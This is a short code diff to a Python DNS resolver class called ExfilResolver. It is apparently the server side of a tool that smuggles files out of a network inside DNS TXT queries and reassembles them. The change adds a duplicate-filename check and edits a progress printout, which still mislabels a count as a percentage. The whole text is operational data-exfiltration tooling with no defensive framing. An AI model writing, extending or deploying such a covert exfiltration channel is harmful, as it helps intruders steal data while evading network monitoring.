@@ -65,9 +65,13 @@ class ExfilResolver(BaseResolver):
 
         if '-' in data: 
             print("New file incoming, lines:", data.split("-")[1])
-            self.files.update({filename: [None] * int(data.split("-")[1])})
-            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
-            return reply 
+            if filename not in self.files:
+                self.files.update({filename: [None] * int(data.split("-")[1])})
+                reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
+                return reply 
+            else:
+                reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Exists")))
+                return reply 
             
 
         # print("DATA RECV:", filename, index, data)
@@ -104,7 +108,7 @@ class ExfilResolver(BaseResolver):
                 
         else:
             # The file is not ready for output
-            print("File:", filename, nones / len(self.files[filename]), "% complete")
+            print("File:", filename, nones, "/", len(self.files[filename]), "% complete")
 
 if __name__ == '__main__':
 
